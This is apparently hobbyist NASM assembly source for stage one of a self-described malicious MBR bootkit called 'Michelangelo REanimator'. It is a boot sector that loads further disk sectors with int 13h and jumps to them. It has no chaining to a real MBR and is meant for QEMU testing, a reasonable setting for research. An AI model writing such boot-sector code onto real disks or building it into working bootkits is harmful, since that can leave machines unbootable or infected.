[bits 16]
;.286			;masm specific
;.MODEL TINY		;masm specific


;******************************************************************************
;	This is the working demo of stage 1 of the malicious MBR/boot sector
; 	of the Michelangelo REanimator bootkit
;	
;	Use at your own risk. 
;	*Plz dont dd your primary hd partition with this. 
;	This is a functional boot sector that will hang once it hits the 
;	last function
;	It was written as a way to test the graphics functionality of my
;	Michelangelo REanimator project
;	There is no functionality in this boot sector to jump to a loaded
; 	valid MBR, or to a valid boot sector
;		
;	To assemble (with nasm):
;	nasm -f bin -o michelange_grafx_routines.mbr michelange_grafx_routines.mbr
;	
;	To run;
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img 
;	Note: the -rtc -device and -display flag values are all based on what 
;   I've used on my own machine as configurations that work well for my use cases.  
;   You may need to adjust them as needed for your own host machine and 
;   what you have installed.
;	To run in a debug session with GDB attached:
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img -s -S
;	(see debugging notes for details on setup of GDBi/Bochs session) 
;
;
;******************************************************************************

.CODE:
org 0x7C00

;******************************************************************************
;SCREEN_MAX			equ	320*200
SCREEN_WIDTH		equ	0x140							;;320
SCREEN_HEIGHT		equ	0xC8							;;200
;SCALED_SCREEN_MAX	equ	0x280*SCALE_MULTIPLIER
SCALED_SCREEN_MAX	equ SCALED_SCREEN_W*SCALED_SCREEN_H
SCALED_SCREEN_W		equ	0x20*SCALE_MULTIPLIER			;;320 / 10
SCALED_SCREEN_H		equ	0x14*SCALE_MULTIPLIER			;;200 / 10 
OFFSET_SCREEN_H		equ SCALED_SCREEN_H*SCREEN_WIDTH
;MBRSPRITE_W			equ	0x10							;;256
;MBRSPRITE_AREA		equ	0x7D00							;;320 / * MBRSPRITE_W
;NEWSPRITE_AREA		equ	0x2800*SCALE_MULTIPLIER			;;320 / * MBRSPRITE_W
;MBR_SIZE			equ 0x200
SECTOR_SIZE			equ 0x200
SCALE_MULTIPLIER	equ 4
;SCALE_MULTIPLIER	equ 10

;SIZESECTORCOPY 		equ SCALE_MULTIPLIER * 0x200
VGA_PAL_INDEX		equ	0x3C8
VGA_PAL_DATA		equ	0x3C9
;******************************************************************************
VX_BOOT:
cli
xor 	ax,ax
mov 	ds,ax
mov 	es,ax
mov 	ss,ax
mov		ax, 0x7c00
mov		sp, ax
sti

;Move to outside of the MBR itself, otherwise you're loading this same file in a loop.
;copy_mbr:
;	mov ax, 0x201	;read one sector of disk
;	mov	cx, 1
;	mov dx, 0x80 	;from Side 0, drive C:
;	lea bx, BUF		;to buffer BUF in DS
;	int 13h

load_vx_paint:
	mov ax, 0x0		;reset disk
	int 13h
	;xor cs, cs
	push cs
	pop es
	push cs
	pop ds
;	mov [DefaultDisk], dl
	;mov ax, 0x0600
	mov ax, 0x0900
	mov es, ax
	mov ds, ax
	;mov bx, 0x7e00
	;mov bx, 0x200
	;mov bx, 0x200
	;xor bx, bx
	;mov [VXPaintBuffer], bx
;	mov [VXPaintBuffer+2], es

;	mov cx, 0x15
	mov cx, 0x2
	;mov cx, 0x1
;	mov cx, 0x0
	push cx
	
	;mov byte [sector_count], 0xD
	;mov si, 0xD
	;push si	
	;;mov word ax, [sector_count]
	;push sector_count
	;mov al, 0xD
	;;push ax
	
	;mov di, 0x600
	xor di, di
	xor si, si
	read_sector:
		
		;mov	cl, [al]	;cylinder 0, sector 13 (0xD)
		;mov ax, 0x203	;read twenty sectors of disk, but one at a time bb
		mov ax, 0x215	;read twenty sectors of disk, but one at a time bb
		
		mov ch, 0
		mov cl, 3
		;mov	cl, 0xD	;cylinder 0, sector 13 (0xD)
		;mov	byte cl, [sector_count]	;cylinder 0, sector 13 (0xD)
		;mov word	cl, [sector_count]	;cylinder 0, sector 13 (0xD)
		
 		;;mov cx, sector_count
		;mov	cl, sector_count	;cylinder 0, sector 13 (0xD)
		;mov	cl, [si]	;cylinder 0, sector 13 (0xD)
		;mov	cl, [sector_num]	;cylinder 0, sector 13 (0xD)
		;;xchg bx, bx
		;mov	cl, 0x3	;cylinder 0, sector 3 (0x3)
		;mov dx, 0x80 	;from Side 0, drive C:
		mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
		;lea bx, VXPaintBuffer
		mov bx, 0x200
		;lea bx, di
		;mov bx, [VXPaintBuffer]		;to buffer BUF in DS
		;mov [VXPaintBuffer], bx	;to buffer BUF in DS
		
		int 13h
		;inc [cl]
		inc cl
		;add byte [cl], 1
		mov byte [sector_count], cl

		;;xchg bx, bx
		;lea si, [bx]
		;;lea di, [bx]
		
		;mov si, [bx]
		;mov cx, 0x100
		;;mov cx, 0x200
		;mov cx, SECTOR_SIZE*3
		mov cx, 2400
		loop:
			mov word ax, [bx]
			mov word [es:di], ax
			;mov word ax, [bx+2]
			;mov word [es:di], ax
			;add si,4
			add bx,2
			add di,2
			;add bx,4
			;add di,4
			
			;inc si
			;inc di
			dec cx
			cmp cx, 0
			jnz loop
		;repnz movsb
		;repnz movsb
		repnz
		;rep movsb
		;rep movsw
		;;xchg bx, bx
		
	;;add di, 512
	;;pop ax
	;;add ax, 0x1
	
	;inc cl
	

	;;pop si
	
	;;inc si
	

	;mov [sector_count], si
	;add si, 0x1
	;pop bx
	;mov bx, sector_count
	;add bx, 1
	;mov [sector_count], bx
	;add byte [sector_count], 0x1
	;mov [sector_count], cl
	;mov [sector_count], ax
	;mov cx, [sector_count]
	;inc cx
	;mov [sector_count], cx
	;;;pop cx
	;add [sector_count], cx
	;mov si, [sector_count]
	
	;;;dec cx
	;inc cx
	;mov [num_sectors], cx
	;add [sector_count], cx
	;push cx
	;;push si
	;cmp byte [sector_count], 0x6
	

	;;;jnz read_sector
	;jl read_sector
	
	;;pop si
	;pop cx
	;xchg bx, bx
	;jmp (boot2nd >> 2):0
	;jmp boot2nd:0000
	jmp boot2nd:0
	;jmp [cs:0x600]
	;call [cs:0x600]

sector_count:
	;db 0x0D
	db 0x03

num_sectors:
	dw 0x0

sector_num equ sector_count+num_sectors

DefaultDisk:
	db 0xD

;boot2nd equ 0x600
boot2nd equ 0x900
	
VXend:
	times 510-($-$$) db 0
	db 0x55
	db 0xAA

